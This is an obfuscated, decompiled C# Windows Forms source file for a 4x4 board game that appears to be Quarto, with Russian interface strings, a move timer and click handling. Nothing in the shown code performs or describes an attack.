using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = -1260577330;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xEA8CB2A8u) % 7u)
					{
					case 5u:
						Point = point;
						num = (int)((num2 * 974146634) ^ 0x845EFC3);
						continue;
					case 4u:
						Dark = dark;
						num = (int)((num2 * 1760329063) ^ 0x740A7238);
						continue;
					case 2u:
						Square = square;
						num = (int)(num2 * 1857182252) ^ -1299875133;
						continue;
					case 1u:
						num = ((int)num2 * -228453) ^ -1152417033;
						continue;
					case 0u:
						Big = big;
						num = ((int)num2 * -1966433732) ^ -486918427;
						continue;
					default:
						return;
					case 6u:
						break;
					case 3u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 1206203859;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x354FA683u) % 7u)
					{
					case 5u:
						Dark = copy.Dark;
						num = (int)(num2 * 327069965) ^ -633343921;
						continue;
					case 4u:
						num = ((int)num2 * -2117676734) ^ 0xBA26C78;
						continue;
					case 3u:
						Big = copy.Big;
						Square = copy.Square;
						num = (int)((num2 * 1926538819) ^ 0x1717F0CE);
						continue;
					case 2u:
						num = (int)(num2 * 115719340) ^ -1903415770;
						continue;
					case 1u:
						Point = copy.Point;
						num = (int)((num2 * 435926797) ^ 0x6C42A98C);
						continue;
					default:
						return;
					case 6u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_02d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		bool flag = default(bool);
		int num5 = default(int);
		int num3 = default(int);
		double num8 = default(double);
		while (true)
		{
			int num = -1576081595;
			while (true)
			{
				uint num2;
				double num9;
				PictureBox[,] array2;
				int num12;
				int num13;
				PictureBox obj2;
				switch ((num2 = (uint)num ^ 0xF0C8DAC5u) % 27u)
				{
				case 26u:
					flag = num5 < 4;
					num = -2113831076;
					continue;
				case 25u:
					num9 = 4.1;
					goto IL_003e;
				case 24u:
					num = (int)((num2 * 1598291557) ^ 0x1251CD9F);
					continue;
				case 23u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num5, num3]);
					num = ((int)num2 * -82647280) ^ -1178395397;
					continue;
				case 22u:
					num = ((int)num2 * -1997897831) ^ -2104335804;
					continue;
				case 21u:
				{
					PictureBox[,] array = borderBox;
					int num6 = num5;
					int num7 = num3;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj, new Point(1 + (int)(((double)num3 + num8) * (double)size), 1 + num5 * size));
					Form1.smethod_7((Control)(object)obj, bool_0: false);
					array[num6, num7] = obj;
					num = (int)(num2 * 915463107) ^ -478455472;
					continue;
				}
				case 20u:
					num = (int)((num2 * 1405050092) ^ 0x16CEFBCE);
					continue;
				case 19u:
					num = (int)((num2 * 444516818) ^ 0x3FF6EAA3);
					continue;
				case 18u:
					num = ((int)num2 * -1499300495) ^ 0x6530569F;
					continue;
				case 17u:
					num3++;
					num = (int)((num2 * 1772460684) ^ 0x173A521A);
					continue;
				case 16u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num5, num3]);
					num = (int)(num2 * 1702574) ^ -240928728;
					continue;
				case 15u:
					InitializeComponent();
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = (int)(num2 * 2099271891) ^ -1425974428;
					continue;
				case 13u:
					num = (int)((num2 * 202536361) ^ 0x41D18CB7);
					continue;
				case 12u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = -1737801025;
						num11 = -1737801025;
					}
					else
					{
						num10 = -1637111397;
						num11 = -1637111397;
					}
					num = num10 ^ ((int)num2 * -1167882439);
					continue;
				}
				case 11u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = (int)((num2 * 1657580243) ^ 0x7465B807);
					continue;
				}
				case 10u:
					num5 = 0;
					num = ((int)num2 * -1992646212) ^ 0xCC326B3;
					continue;
				case 9u:
					if (num3 >= 2)
					{
						num = -2127165608;
						continue;
					}
					num9 = 0.0;
					goto IL_003e;
				case 8u:
					pictureBox = new PictureBox[4, 4];
					num = ((int)num2 * -285887645) ^ 0x6460FF16;
					continue;
				case 6u:
					Form1.smethod_6((Control)(object)pictureBox[num5, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = (int)(num2 * 1449426967) ^ -1862257729;
					continue;
				case 5u:
					num5++;
					num = ((int)num2 * -1504411766) ^ 0x54BD7223;
					continue;
				case 4u:
				{
					int num4;
					if (num3 < 4)
					{
						num = -1505782025;
						num4 = -1505782025;
					}
					else
					{
						num = -838029520;
						num4 = -838029520;
					}
					continue;
				}
				case 3u:
					Form1.smethod_11((Control)(object)menu);
					num = ((int)num2 * -208806613) ^ 0x60985D5E;
					continue;
				case 2u:
					borderBox = new PictureBox[4, 4];
					num = ((int)num2 * -916394337) ^ -209923332;
					continue;
				case 1u:
					num = ((int)num2 * -1211250723) ^ 0x40C68905;
					continue;
				case 0u:
					num3 = 0;
					num = -666803682;
					continue;
				default:
					return;
				case 14u:
					break;
				case 7u:
					return;
					IL_003e:
					num8 = num9;
					array2 = pictureBox;
					num12 = num5;
					num13 = num3;
					obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj2, new Point(4 + (int)(((double)num3 + num8) * (double)size), 4 + num5 * size));
					Form1.smethod_5((Control)(object)obj2, Color.White);
					array2[num12, num13] = obj2;
					num = -2135863076;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -866105412;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB87C2643u) % 9u)
				{
				case 8u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 856905662) ^ -1156066367;
					continue;
				case 7u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)(num2 * 222984939) ^ -592240653;
					continue;
				}
				case 6u:
					num = -2109520371;
					continue;
				case 4u:
					num = (int)((num2 * 1866998669) ^ 0x60FD0244);
					continue;
				case 3u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) < 296)
					{
						num = -1753396913;
						num3 = -1753396913;
					}
					else
					{
						num = -328537778;
						num3 = -328537778;
					}
					continue;
				}
				case 2u:
					num = ((int)num2 * -975305761) ^ -1974781231;
					continue;
				case 1u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -716104565) ^ -2120014949;
					continue;
				default:
					return;
				case 5u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 622363998;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5CC1E855u) % 22u)
				{
				case 21u:
					num = (int)((num2 * 1411154730) ^ 0x10CBD6D4);
					continue;
				case 20u:
					num = ((int)num2 * -1964442090) ^ -1904076484;
					continue;
				case 19u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1133840658) ^ -424952903;
					continue;
				case 18u:
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = ((int)num2 * -2046838032) ^ 0xE8DFDAA;
					continue;
				case 17u:
					num = (int)(num2 * 1657245003) ^ -961408192;
					continue;
				case 15u:
					num = 2052687913;
					continue;
				case 14u:
				{
					int num7;
					if (num3 < 4)
					{
						num = 972033300;
						num7 = 972033300;
					}
					else
					{
						num = 1214458386;
						num7 = 1214458386;
					}
					continue;
				}
				case 13u:
					num3++;
					num = (int)(num2 * 1296627354) ^ -1227793817;
					continue;
				case 12u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					num = (int)((num2 * 1577078260) ^ 0x1C711D15);
					continue;
				case 11u:
					num4++;
					num = (int)(num2 * 164258880) ^ -541157717;
					continue;
				case 10u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = 682002839;
						num6 = 682002839;
					}
					else
					{
						num5 = 312961452;
						num6 = 312961452;
					}
					num = num5 ^ ((int)num2 * -384806838);
					continue;
				}
				case 9u:
					Paint_Board();
					num = ((int)num2 * -1122407402) ^ 0x6F0F0E2C;
					continue;
				case 8u:
					flag = num4 < 4;
					num = 495783573;
					continue;
				case 7u:
					num = ((int)num2 * -1749097968) ^ -1797096884;
					continue;
				case 5u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = (int)((num2 * 471578756) ^ 0x3E67C53C);
					continue;
				case 4u:
					num = ((int)num2 * -1134400145) ^ 0x36911E8D;
					continue;
				case 3u:
					board = new Figurine[4, 4];
					storage = new Figurine[4, 4];
					num = (int)(num2 * 1285798219) ^ -1783008826;
					continue;
				case 2u:
					num4 = 0;
					num = ((int)num2 * -532023442) ^ -351585288;
					continue;
				case 1u:
					Paint_Storage();
					num = (int)((num2 * 1423070610) ^ 0x25752443);
					continue;
				case 0u:
					num3 = 0;
					num = 1809582377;
					continue;
				case 16u:
					break;
				default:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		int num5 = default(int);
		bool flag = default(bool);
		bool square = default(bool);
		float num8 = default(float);
		bool dark = default(bool);
		int num4 = default(int);
		bool flag2 = default(bool);
		float num9 = default(float);
		float num3 = default(float);
		float num6 = default(float);
		float num16 = default(float);
		bool point = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		while (true)
		{
			int num = -947464504;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xDECD784Cu) % 39u)
				{
				case 38u:
					num5++;
					num = ((int)num2 * -411804886) ^ 0x2BC63F1;
					continue;
				case 37u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -223223963) ^ -503245870;
					continue;
				case 36u:
					num = ((int)num2 * -1060202966) ^ -1538878075;
					continue;
				case 35u:
				{
					int num12;
					int num13;
					if (flag)
					{
						num12 = -975874415;
						num13 = -975874415;
					}
					else
					{
						num12 = -9229274;
						num13 = -9229274;
					}
					num = num12 ^ ((int)num2 * -1407703646);
					continue;
				}
				case 34u:
				{
					int num21;
					int num22;
					if (square)
					{
						num21 = -1346950080;
						num22 = -1346950080;
					}
					else
					{
						num21 = -615354771;
						num22 = -615354771;
					}
					num = num21 ^ ((int)num2 * -1756390024);
					continue;
				}
				case 33u:
					num8 = 1f;
					num = ((int)num2 * -342661105) ^ 0x67CDE532;
					continue;
				case 32u:
					num = ((int)num2 * -337226731) ^ 0x2FAAD29;
					continue;
				case 31u:
					dark = board[num5, num4].Dark;
					num = ((int)num2 * -167425379) ^ 0x29C58DEF;
					continue;
				case 30u:
				{
					int num14;
					int num15;
					if (dark)
					{
						num14 = -1574986247;
						num15 = -1574986247;
					}
					else
					{
						num14 = -2097292422;
						num15 = -2097292422;
					}
					num = num14 ^ (int)(num2 * 960772088);
					continue;
				}
				case 29u:
				{
					int num19;
					int num20;
					if (flag2)
					{
						num19 = 1926704864;
						num20 = 1926704864;
					}
					else
					{
						num19 = 318576619;
						num20 = 318576619;
					}
					num = num19 ^ ((int)num2 * -1439057087);
					continue;
				}
				case 28u:
				{
					int num17;
					int num18;
					if (board[num5, num4] != null)
					{
						num17 = 1056232424;
						num18 = 1056232424;
					}
					else
					{
						num17 = 1983611129;
						num18 = 1983611129;
					}
					num = num17 ^ (int)(num2 * 791866759);
					continue;
				}
				case 27u:
					num5 = 0;
					num = ((int)num2 * -574242474) ^ -1005384825;
					continue;
				case 26u:
					num9 = 1f - num8 * 0.4f / (float)Form1.smethod_27(2.0);
					num3 = (float)size * (num9 / 2f);
					num6 = num16 * 0.4f / (float)Form1.smethod_27(2.0);
					point = board[num5, num4].Point;
					num = -1713393322;
					continue;
				case 25u:
					num = -2039088999;
					continue;
				case 24u:
					num4 = 0;
					num = -644493740;
					continue;
				case 23u:
					flag = num5 < 4;
					num = -30817708;
					continue;
				case 22u:
					flag2 = num4 < 4;
					num = -1041024241;
					continue;
				case 21u:
					num = (int)(num2 * 30039558) ^ -475981559;
					continue;
				case 20u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = -1986288404;
					continue;
				case 19u:
					num9 = 1f - num8 * 0.9f / (float)Form1.smethod_27(2.0);
					num16 = (float)size * num8;
					num = -120092736;
					continue;
				case 17u:
					brush_ = Form1.smethod_26();
					num = -198824016;
					continue;
				case 16u:
					num4++;
					num = -644493740;
					continue;
				case 15u:
					num8 = 0.7f;
					num = -1663053812;
					continue;
				case 14u:
					num6 = num16 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 402978052) ^ 0x385E1555);
					continue;
				case 13u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 727767295) ^ 0x1D66EC8B);
					continue;
				case 12u:
					num = (int)((num2 * 165041807) ^ 0x7CBD75C6);
					continue;
				case 11u:
					num = (int)((num2 * 1316954206) ^ 0x7AB8E871);
					continue;
				case 10u:
				{
					int num10;
					int num11;
					if (point)
					{
						num10 = -1773505244;
						num11 = -1773505244;
					}
					else
					{
						num10 = -2063215772;
						num11 = -2063215772;
					}
					num = num10 ^ ((int)num2 * -97090961);
					continue;
				}
				case 9u:
					square = board[num5, num4].Square;
					num = (int)((num2 * 1677355055) ^ 0x6C00FDD3);
					continue;
				case 8u:
					num = ((int)num2 * -527177072) ^ -1364951744;
					continue;
				case 7u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -1296266017) ^ -211931088;
					continue;
				case 6u:
					Form1.smethod_24(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = -336531728;
					continue;
				case 5u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 846054461) ^ 0x37A0F344);
					continue;
				case 4u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1718837509) ^ 0x2EFF22A4;
					continue;
				case 3u:
					num3 = (float)size * (num9 / 2f);
					num = ((int)num2 * -1202000791) ^ 0x285A981A;
					continue;
				case 1u:
				{
					int num7;
					if (board[num5, num4].Big)
					{
						num = -1027649362;
						num7 = -1027649362;
					}
					else
					{
						num = -661712154;
						num7 = -661712154;
					}
					continue;
				}
				case 0u:
					Form1.smethod_28(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -525394134) ^ -185448618;
					continue;
				default:
					return;
				case 18u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		bool flag = default(bool);
		int num9 = default(int);
		float num6 = default(float);
		Graphics graphics_ = default(Graphics);
		float num4 = default(float);
		float num5 = default(float);
		bool big = default(bool);
		bool dark = default(bool);
		bool point = default(bool);
		Brush brush_ = default(Brush);
		float num7 = default(float);
		float num8 = default(float);
		while (true)
		{
			int num2 = -1900790647;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xD31125AFu) % 35u)
				{
				case 34u:
					flag = storage[num, num9] != null;
					num2 = -38146541;
					continue;
				case 33u:
					num6 = 0.7f;
					num2 = -1691378228;
					continue;
				case 32u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num9]));
					num2 = (int)(num3 * 1270138519) ^ -1656362580;
					continue;
				case 31u:
					num2 = (int)((num3 * 1811580396) ^ 0x30405F9);
					continue;
				case 30u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num4, num4, num5, num5);
					num2 = (int)(num3 * 666163619) ^ -183114072;
					continue;
				case 29u:
				{
					int num19;
					int num20;
					if (!big)
					{
						num19 = 459851449;
						num20 = 459851449;
					}
					else
					{
						num19 = 593656352;
						num20 = 593656352;
					}
					num2 = num19 ^ ((int)num3 * -1172375423);
					continue;
				}
				case 28u:
				{
					int num15;
					int num16;
					if (dark)
					{
						num15 = -2005445908;
						num16 = -2005445908;
					}
					else
					{
						num15 = -1552630639;
						num16 = -1552630639;
					}
					num2 = num15 ^ (int)(num3 * 1661731920);
					continue;
				}
				case 27u:
					dark = storage[num, num9].Dark;
					num2 = ((int)num3 * -1531450148) ^ 0x5786D476;
					continue;
				case 25u:
					num2 = ((int)num3 * -1117001356) ^ 0x3C244D9D;
					continue;
				case 24u:
				{
					int num11;
					if (num >= 4)
					{
						num2 = -1115959358;
						num11 = -1115959358;
					}
					else
					{
						num2 = -1626287078;
						num11 = -1626287078;
					}
					continue;
				}
				case 23u:
				{
					int num17;
					int num18;
					if (point)
					{
						num17 = -1354415593;
						num18 = -1354415593;
					}
					else
					{
						num17 = -1246668717;
						num18 = -1246668717;
					}
					num2 = num17 ^ ((int)num3 * -1048017748);
					continue;
				}
				case 22u:
					brush_ = Form1.smethod_25();
					num2 = ((int)num3 * -1667163113) ^ 0x5FE867C2;
					continue;
				case 21u:
					num2 = ((int)num3 * -1930472760) ^ 0x74EE7C3F;
					continue;
				case 20u:
					num6 = 1f;
					num2 = ((int)num3 * -1919099043) ^ 0x75057EA0;
					continue;
				case 19u:
					num9 = 0;
					num2 = -1768301947;
					continue;
				case 18u:
					num4 = (float)size * (num7 / 2f) - 4f;
					num5 = num8 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num, num9].Point;
					num2 = ((int)num3 * -1602469938) ^ -142689396;
					continue;
				case 17u:
					num2 = ((int)num3 * -320121667) ^ -192953825;
					continue;
				case 16u:
					big = storage[num, num9].Big;
					num2 = -2017788420;
					continue;
				case 15u:
					num7 = 1f - num6 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = -992728159;
					continue;
				case 14u:
					brush_ = Form1.smethod_26();
					num2 = -553035401;
					continue;
				case 13u:
					num2 = ((int)num3 * -980823867) ^ 0x4B546C96;
					continue;
				case 12u:
					num9++;
					num2 = -921442275;
					continue;
				case 11u:
					num2 = ((int)num3 * -1444564335) ^ -1431991638;
					continue;
				case 10u:
				{
					int num13;
					int num14;
					if (!flag)
					{
						num13 = -1395316686;
						num14 = -1395316686;
					}
					else
					{
						num13 = -1161315111;
						num14 = -1161315111;
					}
					num2 = num13 ^ (int)(num3 * 1550091863);
					continue;
				}
				case 8u:
					Form1.smethod_30((Control)(object)pictureBox[num, num9]);
					num2 = -1400078061;
					continue;
				case 7u:
					Form1.smethod_20(pictureBox[num, num9], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num9]), Form1.smethod_16((Control)(object)pictureBox[num, num9])));
					num2 = (int)(num3 * 345814764) ^ -591062279;
					continue;
				case 6u:
				{
					int num12;
					if (num9 < 4)
					{
						num2 = -174087723;
						num12 = -174087723;
					}
					else
					{
						num2 = -932773844;
						num12 = -932773844;
					}
					continue;
				}
				case 5u:
					Form1.smethod_28(graphics_, brush_, num4, num4, num5, num5);
					num2 = ((int)num3 * -963711043) ^ -475599009;
					continue;
				case 4u:
					num2 = (int)(num3 * 1925339115) ^ -2048953229;
					continue;
				case 3u:
					num++;
					num2 = ((int)num3 * -2100230912) ^ -1711578263;
					continue;
				case 2u:
				{
					num7 = 1f - num6 * 0.9f / (float)Form1.smethod_27(2.0);
					num8 = (float)size * num6;
					num4 = (float)size * (num7 / 2f) - 4f;
					num5 = num8 * 0.9f / (float)Form1.smethod_27(2.0);
					int num10;
					if (num9 < 2)
					{
						num2 = -994235571;
						num10 = -994235571;
					}
					else
					{
						num2 = -89631061;
						num10 = -89631061;
					}
					continue;
				}
				case 1u:
					num2 = (int)(num3 * 1542470562) ^ -1984937883;
					continue;
				case 0u:
					Form1.smethod_24(graphics_, brush_, num4, num4, num5, num5);
					num2 = -1255457778;
					continue;
				default:
					return;
				case 26u:
					break;
				case 9u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		bool flag2 = default(bool);
		int num3 = default(int);
		bool flag = default(bool);
		int num6 = default(int);
		int num5 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num = -1219835944;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF12D56E5u) % 32u)
				{
				case 31u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -1295052343) ^ -1209338075;
					continue;
				case 30u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -1499614161;
					continue;
				case 29u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -1009418060) ^ 0x8631981;
					continue;
				case 28u:
				{
					int num9;
					int num10;
					if (!flag2)
					{
						num9 = 1009096901;
						num10 = 1009096901;
					}
					else
					{
						num9 = 1072881563;
						num10 = 1072881563;
					}
					num = num9 ^ ((int)num2 * -416916962);
					continue;
				}
				case 27u:
					num3 = 0;
					num = -395112569;
					continue;
				case 26u:
				{
					int num11;
					if (num3 < 4)
					{
						num = -1904798162;
						num11 = -1904798162;
					}
					else
					{
						num = -627809974;
						num11 = -627809974;
					}
					continue;
				}
				case 25u:
					flag = num6 < 4;
					num = -496712943;
					continue;
				case 24u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1513311587) ^ 0x13810F44);
					continue;
				case 23u:
					num = ((int)num2 * -1169871354) ^ -1067043042;
					continue;
				case 22u:
					num = (int)(num2 * 277800274) ^ -545887609;
					continue;
				case 21u:
					flag2 = turn;
					num = (int)((num2 * 1317162566) ^ 0x42424EE7);
					continue;
				case 20u:
				{
					int num7;
					int num8;
					if (!flag)
					{
						num7 = 1267954549;
						num8 = 1267954549;
					}
					else
					{
						num7 = 1039321334;
						num8 = 1039321334;
					}
					num = num7 ^ (int)(num2 * 1885328946);
					continue;
				}
				case 18u:
					Form1.smethod_5((Control)(object)borderBox[num5, num4], Color.Blue);
					num = ((int)num2 * -342130499) ^ 0x35DD21D0;
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -1309041016) ^ -34202964;
					continue;
				case 16u:
					num = ((int)num2 * -896787522) ^ 0x14C5CE7B;
					continue;
				case 15u:
					num6++;
					num = (int)(num2 * 1906357934) ^ -1776738098;
					continue;
				case 14u:
					num6 = 0;
					num = ((int)num2 * -1050939997) ^ 0x21191F6;
					continue;
				case 13u:
					num = (int)(num2 * 1533963396) ^ -32726121;
					continue;
				case 12u:
					num = (int)(num2 * 1683742655) ^ -996976849;
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num3], bool_0: true);
					num = -965433112;
					continue;
				case 10u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = (int)(num2 * 326922068) ^ -271209074;
					continue;
				case 9u:
					step = 0;
					num = ((int)num2 * -1746945366) ^ -891000817;
					continue;
				case 8u:
					num5 = Form1.smethod_33(rnd, 4);
					num = -1233231134;
					continue;
				case 7u:
					num4 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1957044153) ^ -2060008762;
					continue;
				case 6u:
					num3++;
					num = (int)(num2 * 611295213) ^ -1357095503;
					continue;
				case 4u:
					step = 1;
					num = (int)(num2 * 1081525512) ^ -1162469239;
					continue;
				case 3u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -92877619) ^ 0x90A3887;
					continue;
				case 2u:
					num = ((int)num2 * -110634443) ^ 0x6D5BCB5;
					continue;
				case 1u:
					num = (int)((num2 * 1543525902) ^ 0x5F2B87AF);
					continue;
				case 0u:
					num = (int)((num2 * 1401373590) ^ 0x32878F70);
					continue;
				case 19u:
					break;
				default:
					Form1.smethod_36(timer1);
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
		while (true)
		{
			int num = -56742523;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE4F834C9u) % 3u)
				{
				case 2u:
					goto IL_0041;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0041:
				num = (int)(num2 * 1701178307) ^ -1848836418;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		int num3 = default(int);
		int num6 = default(int);
		bool flag4 = default(bool);
		int num4 = default(int);
		int num5 = default(int);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 370506626;
			while (true)
			{
				uint num2;
				int num9;
				switch ((num2 = (uint)num ^ 0x33D12543u) % 23u)
				{
				case 22u:
					Form1.smethod_5((Control)(object)borderBox[num3, num6], Color.White);
					num = 1114883596;
					continue;
				case 21u:
					num = (int)((num2 * 2147179287) ^ 0x18AE9231);
					continue;
				case 19u:
					flag4 = num6 < 4;
					num = 774581684;
					continue;
				case 18u:
					num4 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).Y / size;
					num5 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).X / size;
					num = (int)(num2 * 1576318442) ^ -1026461174;
					continue;
				case 17u:
					num9 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num4, num5]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00cc;
				case 16u:
					num3 = 0;
					num = ((int)num2 * -128797752) ^ 0x333B9007;
					continue;
				case 15u:
				{
					int num12;
					int num13;
					if (!flag4)
					{
						num12 = -2110484176;
						num13 = -2110484176;
					}
					else
					{
						num12 = -1148521461;
						num13 = -1148521461;
					}
					num = num12 ^ (int)(num2 * 733896311);
					continue;
				}
				case 14u:
					flag2 = num5 > 1;
					num = ((int)num2 * -887987943) ^ 0x1A15FC26;
					continue;
				case 13u:
					if (storage[num4, num5] != null)
					{
						num = 1294076300;
						continue;
					}
					num9 = 0;
					goto IL_00cc;
				case 11u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 526567822) ^ -1536021238;
					continue;
				case 10u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -634994414) ^ -1121983270;
					continue;
				case 9u:
					num5 -= 4;
					num = ((int)num2 * -1883640689) ^ 0x75BFDEB2;
					continue;
				case 8u:
				{
					int num14;
					int num15;
					if (flag2)
					{
						num14 = 487728672;
						num15 = 487728672;
					}
					else
					{
						num14 = 1173560607;
						num15 = 1173560607;
					}
					num = num14 ^ ((int)num2 * -171172427);
					continue;
				}
				case 7u:
				{
					int num10;
					int num11;
					if (!flag3)
					{
						num10 = 110770758;
						num11 = 110770758;
					}
					else
					{
						num10 = 1309660894;
						num11 = 1309660894;
					}
					num = num10 ^ (int)(num2 * 960343754);
					continue;
				}
				case 6u:
					num6 = 0;
					num = 2067164768;
					continue;
				case 5u:
					num = (int)((num2 * 630387023) ^ 0x7011D841);
					continue;
				case 4u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = 832160233;
						num8 = 832160233;
					}
					else
					{
						num7 = 503871510;
						num8 = 503871510;
					}
					num = num7 ^ (int)(num2 * 1430019782);
					continue;
				}
				case 3u:
					flag = num3 < 4;
					num = 2014028297;
					continue;
				case 2u:
					num6++;
					num = (int)((num2 * 241982066) ^ 0x43C505A2);
					continue;
				case 1u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.Red);
					num = (int)(num2 * 2052322842) ^ -1328434877;
					continue;
				case 0u:
					num3++;
					num = (int)(num2 * 440295294) ^ -462145149;
					continue;
				default:
					return;
				case 12u:
					break;
				case 20u:
					return;
					IL_00cc:
					flag3 = (byte)num9 != 0;
					num = 970377502;
					continue;
				}
				break;
			}
		}
	}

